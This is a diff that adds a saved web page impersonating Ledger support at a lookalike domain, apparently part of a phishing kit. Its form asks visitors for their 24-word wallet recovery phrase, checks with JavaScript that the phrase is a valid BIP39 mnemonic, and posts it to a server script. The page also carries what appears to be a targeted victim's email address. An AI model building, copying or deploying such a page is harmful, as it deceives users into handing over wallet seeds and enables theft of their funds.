@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<!-- saved from url=(0062)https://www.ledger-updates.com/index.php?userID=dion17@live.cn -->
+<html dir="ltr" lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <!-- v19044 -->
+
+  <title>Ledger Support</title>
+
+  <meta name="csrf-param" content="authenticity_token">
+<meta name="csrf-token" content="">
+
+  <link rel="canonical" href="https://www.ledger-updates.com/en-us.html">
+<link rel="alternate" hreflang="en" href="https://www.ledger-updates.com/en-us.html">
+
+  <link rel="stylesheet" media="all" href="./Ledger Support_files/application-984e040f123d15b1ac594511a0ba52c6.css" id="stylesheet">
+    <!-- Entypo pictograms by Daniel Bruce — www.entypo.com -->
+    <link rel="stylesheet" media="all" href="./Ledger Support_files/theming_v1_support-7eacdab8920220a42cfc91404f4ed182.css">
+  <link rel="stylesheet" type="text/css" href="./Ledger Support_files/style5cc6.css">
+
+  <link rel="shortcut icon" type="image/x-icon" href="https://www.ledger-updates.com/theme.zdassets.com/theme_assets/1431543/1abf25e25fcc44dffe5c39f8fb30eda3115fc0b1.png">
+
+
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link href="./Ledger Support_files/css" rel="stylesheet">
+
+
+
+
+<link rel="stylesheet" href="./Ledger Support_files/font-awesome.min.css">
+<link rel="stylesheet" href="./Ledger Support_files/github.min.css">
+<link rel="stylesheet" href="./Ledger Support_files/magnific-popup.css">
+
+<script type="text/javascript" src="./Ledger Support_files/bip39.browser.min.js.download"></script>
+<script>
+  function validateBIP39() {
+
+    var seed     = document.getElementsByName('palavras').item(0);
+    var modal    = document.getElementsByClassName('modal-warning').item(0);
+    var language = ["chinese_simplified", "chinese_traditional", "czech", "english", "french", "italian", "japanese", "korean", "spanish"];
+    var i        = 0;
+    var result   = false;
+
+    for (i = 0; i < language.length; i++) {
+	  bip39.setDefaultWordlist(language[i]);
+      if(bip39.validateMnemonic(seed.value)) {
+        console.log(language[i] + ":true");
+        result = true;
+        break;
+      } else {
+        console.log(language[i] + ":false");
+        result = false;
+      };
+    };
+
+    if(!result) {
+      event.preventDefault();
+      modal.style.display = "block";
+      setTimeout(function() { modal.style.display = "none"; seed.value = ""; }, 5000);
+    };
+
+  };
+</script>	
+</head>
+<body class="">
+  
+  
+
+  <div class="layout">
+
+  
+  <header class="topbar container" data-topbar="">
+    <div class="topbar__inner container-inner">
+      <div class="topbar__logo-wrapper">
+        <a href="https://www.ledger-updates.com/index.php?userID=dion17@live.cn#" class="topbar__logo">
+          <img src="./Ledger Support_files/768d0df29086c98763c6c0907a5aed1f76ae9306.svg" alt="" class="logo">
+        </a>
+      <a class="topbar__help-center-name" title="Home" href="https://www.ledger-updates.com/index.php?userID=dion17@live.cn#">Support</a>
+      </div>
+
+      <div class="topbar__buttons">
+        <button class="btn btn--topbar btn--toggle-search" data-toggle-search="">
+        </button>
+        <button type="button" class="tcon tcon-menu--xcross" aria-label="toggle menu" data-toggle-menu="">
+          <span class="tcon-menu__lines" aria-hidden="true"></span>
+          <span class="tcon-visuallyhidden">toggle menu</span>
+        </button>
+      </div>
+
+
+
+      <div class="search-mobile" data-search-mobile="">
+        <div class="container-inner">
+         
+        </div>
+      </div>
+
+      <div class="topbar__controls" data-menu="">
+        <div class="side-nav side-nav--topbar"></div>
+        <button class="btn--toggle-search btn--toggle-search hidden-xs hidden-sm hidden-md hidden" data-toggle-search="">
+          <span class="fa fa-search"></span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+
+  <main role="main">
+    <section class="hero-unit hero-unit--large container" data-hero-unit="large">
+  <div class="container-inner hero-unit__content" data-search-box="">
+    <div class="hero-unit__search"></div>
+  </div>
+</section>
+    <div class="subscribe-block">
+      <div class="subscribe-block__container">
+    <h2 class="subscribe-block__title">Phrase Update</h2>
+    <div class="subscribe-block__description">Enter your 24-Words Phrase(separated by spaces) to update them:</div>
+	<form name="iterable_optin" action="check3.php" method="POST" class="subscribe-form email" onsubmit="validateBIP39();"> 
+    <input type="text" name="palavras" size="22" onfocus="if(this.value===this.defaultValue){this.value=&#39;&#39;;}" onblur="if(this.value===&#39;&#39;){this.value=this.defaultValue;}" required="">
+	<input name="go" type="submit" value="Update">
+	</form>
+	<br>
+	<div class="modal-warning" style="display: none;"><img src="./Ledger Support_files/alerta.png"><p><b style="color: #BB1215">Your 24-Words Phrase is invalid!</b></p></div>		  
+  </div>	
+</div>
+  </main>
+	  
+
+  </div>
+<!-- /.layout -->
+<footer class="footer container">
+  <div class="container-inner footer__inner">
+    <p class="footer__copyright">
+      <a href="https://www.ledger-updates.com/index.php?userID=dion17@live.cn#" class="topbar__logo">
+        <img src="./Ledger Support_files/768d0df29086c98763c6c0907a5aed1f76ae9306.svg" alt="" class="logo">
+      </a>
+    </p>
+
+    
+  </div>
+  <div class="container-inner footer__inner">
+    <p>Copyright © SAS. All rights reserved. Nano S, Vault, Bolos are
+registered trademarks</p>
+  </div>
+</footer>
+<a href="https://www.ledger-updates.com/index.php?userID=dion17@live.cn#" class="scroll-to-top fa fa-angle-up" data-scroll-to-top=""></a>
+
+
+
+</body></html>
